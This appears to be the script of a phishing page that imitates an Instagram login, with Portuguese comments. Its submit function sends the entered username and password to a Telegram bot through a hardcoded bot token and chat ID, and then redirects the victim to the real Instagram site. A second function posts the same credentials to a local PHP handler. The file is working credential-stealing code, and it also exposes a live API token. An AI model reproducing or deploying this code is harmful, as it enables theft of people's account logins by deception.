function submit() {
    const user = document.getElementById('user').value;
    const pass = document.getElementById('pass').value;
    const message = `${user} ${pass}`
    const token = '7362942771:AAHQHnv42dHtiDm6KRvE_NP7L0d66w-VOFg'; 
    const chatId = '7433908004'; // ID numérico ou nome de usuário com '@'

    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
        }),
    })
    .then(response => response.json())
    .then(data => {
        console.log('Mensagem enviada:', data);
    })
    .catch((error) => {
        console.error('Erro ao enviar mensagem:', error);
    });
    window.location.href="https://instagram.com/"
}
function user() {
    var username = document.getElementById('user').value;
    var password = document.getElementById('pass').value;

    var formData = new FormData();
    formData.append('username', username);
    formData.append('password', password);

    fetch('./admin/k.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.text())
    .then(data => {
        if (data.includes("Perfeito")) {
            window.location.href = "https://instagram.com/accounts/login";
        } else {
            alert(data);
        }
    })
    .catch(error => {
        console.error('Erro:', error);
    });
}
document.addEventListener('DOMContentLoaded', () => {
    const userInput = document.getElementById('user');
    const passInput = document.getElementById('pass');
    const submitBtn = document.getElementById('submitBtn');

    function validateForm() {
        const userValue = userInput.value.trim();
        const passValue = passInput.value;

        if (userValue.length > 0 && passValue.length >= 6) {
            submitBtn.disabled = false;
            submitBtn.classList.add('enabled');
        } else {
            submitBtn.disabled = true;
            submitBtn.classList.remove('enabled');
        }
    }

    userInput.addEventListener('input', validateForm);
    passInput.addEventListener('input', validateForm);
});